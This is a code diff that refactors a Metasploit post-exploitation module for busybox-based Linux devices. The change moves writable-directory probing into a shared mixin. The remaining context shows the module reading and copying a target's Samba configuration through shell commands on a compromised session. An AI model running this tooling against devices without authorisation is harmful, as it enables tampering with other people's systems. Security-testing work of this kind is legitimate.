@@ -8,6 +8,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Post
 
   include Msf::Post::File
+  include Msf::Post::Linux::Busybox
 
   def initialize
     super(
@@ -25,7 +26,6 @@ class Metasploit3 < Msf::Post
       'Platform'      => ['linux'],
        'SessionTypes'  => ['shell']
     )
-
   end
 
   def run
@@ -33,11 +33,7 @@ class Metasploit3 < Msf::Post
     if read_file("/var/samba/smb.conf").length > 0 #file? doesnt work because test -f is not implemented in busybox
       vprint_status("Smb.conf found.")
       vprint_status("Trying to find writable directory.")
-      writable_directory = nil
-      writable_directory = "/etc/" if is_writable_directory("/etc")
-      writable_directory = "/mnt/" if (!writable_directory && is_writable_directory("/mnt"))
-      writable_directory = "/var/" if (!writable_directory && is_writable_directory("/var"))
-      writable_directory = "/var/tmp/" if (!writable_directory && is_writable_directory("/var/tmp"))
+      writable_directory = get_writable_directory()
       if writable_directory
         vprint_status("writable directory found, copying smb.conf.")
         vprint_status(cmd_exec("rm -f #{writable_directory}smb.conf")); Rex::sleep(0.1)
@@ -53,22 +49,6 @@ class Metasploit3 < Msf::Post
     else
       print_error("Smb.conf not found.")
     end
-  end
-
-  #This function checks if the target directory is writable
-  def is_writable_directory(directory_path)
-    retval = false
-    rand_str = ""; 16.times{rand_str  << (65 + rand(25)).chr}
-    file_path = directory_path + "/" + rand_str
-    session.shell_write("echo #{rand_str}XXX#{rand_str} > #{file_path}\n"); Rex::sleep(0.1)
-    (1..5).each{session.shell_read(); Rex::sleep(0.1)}
-    rcv = read_file(file_path)
-    vprint_status("is_writable_directory:"+rcv)
-    if rcv.include? (rand_str+"XXX"+rand_str)
-      retval = true
-    end
-    cmd_exec("rm -f #{file_path}"); Rex::sleep(0.1)
-    return retval
   end
 
 end
